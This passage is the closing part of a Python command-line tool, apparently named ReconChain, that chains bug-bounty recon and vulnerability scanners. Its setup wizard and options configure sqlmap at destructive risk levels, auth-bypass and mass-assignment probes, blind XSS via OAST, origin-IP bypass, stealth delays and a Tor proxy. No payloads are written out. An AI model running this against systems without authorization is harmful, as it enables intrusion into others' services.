                log("warn", f"state.json write failed: {e}")
    finally:
        _cleanup_child_procs()
        signal.signal(signal.SIGINT, _orig_sigint)
        signal.signal(signal.SIGTERM, _orig_sigterm)
        if oast_started and not h_selected:
            oast.stop()
        _JOB_SEM = None
    counts = _counts(outdir)
    sj = write_summary(outdir, args.domain, state, counts)
    # Reopen summary.json to inject phase_timing after write_summary
    if sj.exists():
        try:
            with sj.open() as f:
                summ = json.load(f)
            summ["phase_timing"] = phase_timing
            _atomic_write_json(sj, summ)
        except Exception:
            pass
    hj = write_html(outdir, args.domain, counts, t.missing)
    mj = write_markdown(outdir, args.domain, counts, t.missing)
    tj = write_full_summary(outdir, args.domain, counts, t.missing)
    log("ok", f"summary → {sj}")
    log("ok", f"report  → {hj}")
    log("ok", f"report  → {mj}")
    log("ok", f"details → {tj}")
    progress.close()
    return 0


# ────────────────────────── interactive setup ──────────────────────────────
_RECON_LEVELS = {
    "1": {
        "name": "Basic reconnaissance",
        "desc": "Subdomains → DNS → Ports/HTTP → URLs → Report (fast, no vuln scanning)",
        "phases": {"01-RECON", "02-RESOLVE", "04-SCAN", "05-HARVEST", "17-REPORT"},
    },
    "2": {
        "name": "Standard assessment",
        "desc": "Basic + JS secrets + params + fuzzing + nuclei + TLS/WordPress",
        "phases": {"01-RECON", "02-RESOLVE", "04-SCAN", "05-HARVEST", "06-JSINTEL", "07-PARAMS", "08-FUZZ", "09-VULNSCAN", "10-TLSCMS", "17-REPORT"},
    },
    "full": {
        "name": "Full audit",
        "desc": "Standard + SSTI + origin bypass + deep JS + auth bypass/mass assignment",
        "phases": VALID_PHASES,
    },
}


def _prompt(
    prompt_text: str,
    default: str = "",
    validator: Optional[Callable[[str], bool]] = None,
    error_msg: str = "",
) -> str:
    while True:
        suffix = f" [{default}]" if default else ""
        val = input(f"  {prompt_text}{suffix}: ").strip()
        if not val:
            return default
        if validator is None or validator(val):
            return val
        log("err", error_msg or "invalid input")


def _prompt_yes_no(prompt_text: str, default: bool = True) -> bool:
    suffix = " [Y/n]" if default else " [y/N]"
    val = input(f"  {prompt_text}{suffix}: ").strip().lower()
    if not val:
        return default
    return val in ("y", "yes")


def _banner() -> None:
    banner = f"""
{C["c"]}    ██████╗ ██████╗ ████████╗
{C["c"]}    ██╔══██╗██╔══██╗╚══██╔══╝
{C["c"]}    ██████╔╝██████╔╝   ██║
{C["c"]}    ██╔══██╗██╔══██╗   ██║
{C["c"]}    ██████╔╝██████╔╝   ██║
{C["c"]}    ╚═════╝ ╚═════╝    ╚═╝
{C["r"]}
{C["g"]}   ╔══════════════════════════════════════════════════════╗
{C["g"]}   ║  {C["c"]}ReconChain v{__version__}{C["g"]}  —  {C["y"]}Bug Bounty Recon & Vuln Pipeline{C["g"]}   ║
{C["g"]}   ║  {C["d"]}25+ tools  |  Resumable  |  Interactive  |  Self-contained{C["g"]}   ║
{C["g"]}   ╚══════════════════════════════════════════════════════╝{C["r"]}
"""
    print(banner, flush=True)


def interactive_setup() -> argparse.Namespace:
    _banner()
    log("info", "Interactive setup — press Ctrl+C anytime to abort\n")
    # 1. Domain
    domain = _prompt(
        "Target domain (e.g. example.com)",
        validator=_is_valid_hostname,
        error_msg="Enter a valid domain with at least one dot",
    )
    # 2. Recon level
    print(f"\n{C['b']}Recon levels:{C['r']}")
    for key, lvl in sorted(_RECON_LEVELS.items()):
        print(f"  {C['y']}{key:4}{C['r']} {lvl['name']}")
        print(f"       {C['d']}{lvl['desc']}{C['r']}")
    level = _prompt(
        "Choose recon level",
        default="full",
        validator=lambda v: v in _RECON_LEVELS,
        error_msg="Enter 1, 2, or full",
    )
    base_phases = _RECON_LEVELS[level]["phases"]
    # 3. Output directory
    out = _prompt("Output directory", default=f"./out_{domain}")
    # 4. Concurrent jobs
    jobs_str = _prompt(
        "Max parallel processes",
        default=str(MAX_PARALLEL_JOBS),
        validator=lambda v: v.isdigit() and int(v) > 0,
        error_msg="Enter a positive number",
    )
    jobs = int(jobs_str)
    # 5. Scan depth configuration
    print(f"\n{C['b']}Scan depth configuration:{C['r']}")
    sqlmap_level = _prompt(
        "SQLmap --level (1=fast/basic, 5=deep/slow)",
        default="1",
        validator=lambda v: v.isdigit() and 1 <= int(v) <= 5,
        error_msg="Enter a number between 1 and 5",
    )
    sqlmap_risk = _prompt(
        "SQLmap --risk (1=safe, 3=aggressive/destructive)",
        default="1",
        validator=lambda v: v.isdigit() and 1 <= int(v) <= 3,
        error_msg="Enter a number between 1 and 3",
    )
    delay = _prompt(
        "Delay between requests in seconds (0=fast, 2=polite, 5=stealth)",
        default="0",
        validator=lambda v: v.replace(".", "", 1).isdigit(),
        error_msg="Enter a number (e.g. 0, 0.5, 2)",
    )
    def _validate_count(v: str) -> bool:
        return v.lower() == "all" or (v.isdigit() and int(v) > 0)

    sample_fuzz = _prompt(
        "Number of URLs to fuzz (enter 'all' for every URL, more = thorough but slow)",
        default="5",
        validator=_validate_count,
        error_msg="Enter a positive number or 'all'",
    )
    sample_params = _prompt(
        "Number of URLs for parameter discovery (enter 'all' for every URL, more = thorough but slow)",
        default="50",
        validator=_validate_count,
        error_msg="Enter a positive number or 'all'",
    )
    # 6. Authentication / headers
    print(f"\n{C['b']}Authentication:{C['r']}")
    cookie = _prompt(
        "Cookie string (e.g. 'session=abc123'), or leave empty",
        default="",
    )
    extra_headers_raw = _prompt(
        "Extra HTTP headers, comma-separated (e.g. 'Authorization: Bearer xyz,X-Custom: val'), or leave empty",
        default="",
    )
    extra_headers_list: List[str] = [h.strip() for h in extra_headers_raw.split(",") if h.strip()] if extra_headers_raw else []
    # 7. Manual testing add-ons (only for level 2 / full)
    extra_phases: Set[str] = set()
    if level in ("2", "full"):
        print(f"\n{C['b']}Additional manual-testing phases:{C['r']}")
        for p, desc in [
            ("12-SSTI", "SSTI fuzzing"),
            ("14-ORIGIN", "Origin IP bypass (Cloudflare)"),
            ("15-SECRETS", "Deep JS secret scanning"),
            ("16-AUTHZ", "Auth bypass + mass assignment probes"),
        ]:
            if _prompt_yes_no(f"Run {C['y']}{p}{C['r']} - {desc}", default=(level == "full")):
                extra_phases.add(p)
    selected = base_phases | extra_phases
    # 8. Resume / Force
    state_path = Path(out) / "state.json"
    resume = False
    force = False
    if state_path.exists():
        resume = _prompt_yes_no("State file exists — resume previous scan", default=True)
        if resume:
            force = _prompt_yes_no("Force re-run all phases (ignore cached results)", default=False)
    # 9. Summary
    print(f"\n{C['b']}{'─' * 60}{C['r']}")
    print(f" {C['g']}Scan summary:{C['r']}")
    print(f"   Domain:           {C['y']}{domain}{C['r']}")
    print(f"   Output:           {C['y']}{out}{C['r']}")
    print(f"   Level:            {C['y']}{level}{C['r']}")
    print(f"   Phases:           {C['y']}{', '.join(sorted(selected))}{C['r']}")
    print(f"   Jobs:             {C['y']}{jobs}{C['r']}")
    print(f"   SQLmap level/risk:{C['y']} {sqlmap_level}/{sqlmap_risk}{C['r']}")
    print(f"   Delay:            {C['y']}{delay}s{C['r']}")
    print(f"   Cookie:           {C['y']}{'set' if cookie else 'none'}{C['r']}")
    print(f"   Extra headers:    {C['y']}{len(extra_headers_list)} set{C['r']}")
    print(f"   Resume:           {C['y']}{'yes' if resume else 'no'}{C['r']}")
    print(f"   Force:            {C['y']}{'yes' if force else 'no'}{C['r']}")
    print(f" {C['b']}{'─' * 60}{C['r']}")
    if not _prompt_yes_no("Start scan", default=True):
        log("info", "Aborted by user")
        sys.exit(0)

    # Build a namespace that run_pipeline expects
    class NS:
        pass

    ns = NS()
    ns.domain = domain
    ns.out = out
    ns.only = selected
    ns.skip = set()
    ns.jobs = jobs
    ns.fast = False
    ns.resume = resume
    ns.force = force
    ns.sample = False
    ns.quiet = False
    ns.no_color = False
    ns.interactive = True
    ns.sqlmap_level = int(sqlmap_level)
    ns.sqlmap_risk = int(sqlmap_risk)
    ns.delay = float(delay)
    ns.rate_limit = 0
    def _resolve_count(v: str) -> int:
        return 10**9 if v.lower() == "all" else int(v)

    ns.sample_urls_fuzz = _resolve_count(sample_fuzz)
    ns.sample_urls_params = _resolve_count(sample_params)
    ns.cookie = cookie
    ns.extra_headers = extra_headers_list if extra_headers_list else []
    return ns


# ─────────────────────────────────── main ──────────────────────────────────
def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="reconchain", description="Chain recon tools into a single orchestrated pipeline."
    )
    p.add_argument(
        "-d", "--domain", type=str, default="", help="target root domain, e.g. example.com"
    )
    p.add_argument("-o", "--out", default="", help="output directory (default: ./out/<domain>)")
    p.add_argument(
        "-i",
        "--interactive",
        action="store_true",
        help="interactive setup wizard (prompts for domain, level, etc.)",
    )
    p.add_argument(
        "--only",
        default=set(),
        type=_parse_phase_csv,
        help="comma-separated phases to run, e.g. 01-RECON,02-RESOLVE,04-SCAN",
    )
    p.add_argument(
        "--skip",
        default=set(),
        type=_parse_phase_csv,
        help="comma-separated phases to skip, e.g. 10-TLSCMS,G",
    )
    p.add_argument(
        "-j",
        "--jobs",
        type=int,
        default=MAX_PARALLEL_JOBS,
        help=f"max parallel external processes (default: {MAX_PARALLEL_JOBS})",
    )
    p.add_argument(
        "--fast",
        action="store_true",
        help="fast mode: only run essential recon phases "
        "(01-RECON, 02-RESOLVE, 04-SCAN, 05-HARVEST, 17-REPORT), skipping vuln scanning",
    )
    p.add_argument(
        "--resume",
        action="store_true",
        help="resume from ./out/state.json if it exists (only for the same target domain)",
    )
    p.add_argument(
        "--force",
        action="store_true",
        help="re-run all phases even if output files already exist",
    )
    p.add_argument(
        "--sample",
        action="store_true",
        help="downsample artifacts to 1 entry for faster downstream testing (default: keep all results)",
    )
    p.add_argument(
        "--keep-all",
        action="store_true",
        help=argparse.SUPPRESS,
    )
    p.add_argument("-q", "--quiet", action="store_true", help="suppress info-level logs")
    p.add_argument("--no-color", action="store_true", help="disable ANSI color output")
    p.add_argument(
        "--proxy",
        type=str,
        default="",
        help="proxy URL for tools that support it, e.g. socks5://127.0.0.1:9050",
    )
    p.add_argument(
        "--cookie",
        type=str,
        default="",
        help="cookie string to include with HTTP requests (e.g. 'session=abc')",
    )
    p.add_argument(
        "--header",
        type=str,
        action="append",
        default=[],
        dest="extra_headers",
        help="extra HTTP header (can be repeated), e.g. --header 'Authorization: Bearer xyz'",
    )
    p.add_argument(
        "--sqlmap-level",
        type=int,
        default=1,
        choices=range(1, 6),
        help="sqlmap --level (1-5, default: 1; higher = deeper but slower)",
    )
    p.add_argument(
        "--sqlmap-risk",
        type=int,
        default=1,
        choices=range(1, 4),
        help="sqlmap --risk (1-3, default: 1; higher = more payloads but destructive)",
    )
    p.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="seconds to wait between requests (polite mode)",
    )
    p.add_argument(
        "--rate-limit",
        type=int,
        default=0,
        help="max requests per second (0 = unlimited)",
    )
    p.add_argument(
        "--sample-urls-fuzz",
        type=int,
        default=5,
        help="number of URLs to sample for fuzzing (default: 5)",
    )
    p.add_argument(
        "--sample-urls-params",
        type=int,
        default=50,
        help="number of URLs to sample for parameter discovery (default: 50)",
    )
    p.add_argument(
        "--sample-hosts-ssl",
        type=int,
        default=10,
        help="number of hosts to sample for SSL/TLS scanning via testssl (default: 10)",
    )
    p.add_argument(
        "--sample-hosts-origin",
        type=int,
        default=10,
        help="number of hosts to sample for origin bypass scans (favicon, crt.sh resolve, ipinfo) (default: 10)",
    )
    p.add_argument(
        "--sample-endpoints-l",
        type=int,
        default=20,
        help="number of endpoints to sample for auth bypass / mass assignment probes (default: 20)",
    )
    p.add_argument(
        "--sample-urls-xss-blind",
        type=int,
        default=20,
        help="number of URLs to probe for blind XSS via OAST (default: 20)",
    )
    p.add_argument(
        "--exclude-tags",
        type=str,
        default="",
        help="nuclei tags to exclude (comma-separated), e.g. 'info,tech'",
    )
    p.add_argument(
        "--sample-urls-ssti",
        type=int,
        default=5,
        help="number of SSTI probe URLs (default: 5)",
    )
    p.add_argument(
        "--sample-endpoints-post",
        type=int,
        default=5,
        help="number of endpoints for POST mass-assignment probes (default: 5)",
    )
    p.add_argument(
        "--sample-endpoints-cors",
        type=int,
        default=10,
        help="number of endpoints for CORS misconfiguration probes (default: 10)",
    )
    return p


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    if args.interactive:
        args = interactive_setup()
    else:
        if not args.domain or not _is_valid_hostname(args.domain):
            parser.error(
                "the following arguments are required: -d/--domain (or use -i for interactive)"
            )
        args.domain = args.domain.rstrip(".").lower()
    if not args.out:
        args.out = f"./out/{args.domain}"
    if args.no_color:
        disable_color()
    if args.only and args.skip and (args.only & args.skip):
        parser.error(
            "phase(s) cannot be both --only and --skip: " + ", ".join(sorted(args.only & args.skip))
        )
    if args.quiet:
        global log

        def log(lvl, msg):  # type: ignore
            if lvl in ("ok", "err", "warn"):
                ts = datetime.now().strftime("%H:%M:%S")
                print(f"{ts} [{lvl.upper():4}] {msg}", flush=True)

    try:
        return asyncio.run(run_pipeline(args))
    except ValueError as e:
        log("err", str(e))
        return 2
    except KeyboardInterrupt:
        log("warn", "interrupted")
        return 130


if __name__ == "__main__":
    sys.exit(main())
